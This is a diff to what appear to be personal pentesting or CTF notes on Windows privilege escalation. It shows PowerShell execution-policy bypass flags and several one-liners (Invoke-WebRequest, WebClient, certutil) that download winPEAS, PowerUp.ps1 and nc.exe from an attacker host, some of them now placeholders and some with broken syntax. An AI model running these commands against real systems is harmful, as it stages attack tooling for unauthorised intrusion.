@@ -160,6 +160,7 @@
 
 # Commands
 - powershell -exec bypass
+- powershell -ep bypass
 - systeminof
   - part of Active Directory (workgroup / domain)
 - wmic = Windows Management Instrumentation Command-line
@@ -260,9 +261,9 @@
 
 - findstr = grep
 - Windows: get file 
-  - powershell -c Invoke-Webrequest -OutFile winPeas.bat http://10.9.1.255/winPEAS.bat
-  - powershell -c "(new-object System.Net.WebClient).Downloadfile('https://10.9.1.255:80/PowerUp.ps1', 'C:\Users\fela.CORP\Downloads\PowerUp.ps1')"
-  - powershell -c wget "https://10.9.1.255:80/PowerUp.ps1" -outfile "PowerUp.ps1"
+  - powershell -c Invoke-Webrequest -OutFile winPeas.bat http://**IP_ATTACKER/FIlE**
+  - powershell -c "(new-object System.Net.WebClient).Downloadfile('https://1**IP_ATTACKER/FIlE**, 'C:\Users\fela.CORP\Downloads\PowerUp.ps1')"
+  - powershell -c wget "h**IP_ATTACKER/FIlE** -outfile "PowerUp.ps1"
   - **certutil** -urlcache -f http://10.9.1.255:80/nc.exe nc.exe
 
 - check permision
